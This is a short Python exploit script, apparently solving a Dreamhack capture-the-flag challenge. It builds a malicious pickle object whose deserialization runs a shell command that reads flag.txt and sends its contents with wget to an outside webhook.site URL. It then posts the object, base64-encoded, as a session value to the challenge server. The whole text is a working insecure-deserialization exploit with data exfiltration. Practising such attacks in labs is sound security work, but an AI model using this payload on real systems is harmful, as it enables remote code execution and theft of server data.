import pickle
import base64
import os
import requests

class Payload():
    def __reduce__(self):
        return (os.system, ("flag=$(cat flag.txt); wget https://webhook.site/8aef8632-326f-4ac7-bda3-22f53ccd1c0f/?flag=$flag",))
    

obj = Payload()
payload = base64.b64encode(pickle.dumps(obj))

url = "http://host3.dreamhack.games:20837/check_session"
session = {
    "session": payload.decode()
}

r = requests.post(url, data=session)
print(r.text)